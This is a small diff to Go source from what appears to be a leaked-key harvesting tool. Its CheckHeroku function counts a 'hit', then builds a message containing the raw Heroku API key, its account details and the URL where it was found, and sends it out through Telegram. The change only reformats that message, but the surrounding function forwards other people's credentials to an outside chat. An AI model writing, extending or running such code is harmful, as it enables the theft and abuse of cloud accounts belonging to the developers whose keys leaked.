@@ -65,7 +65,7 @@ func (a *AWSScanner) CheckHeroku(key, sourceURL string) bool {
 	globalCounters.mu.Unlock()
 
 	msg := a.tgHit("🟣", "HEROKU", sourceURL) + fmt.Sprintf(
-		"\n🔑 <b>Key:</b> <code>%s</code>\n👤 <b>Account:</b> %s\n", key, info)
+		"Key : %s\nAccount : %s\n", key, info)
 	go a.sendTelegram(msg)
 	return true
 }
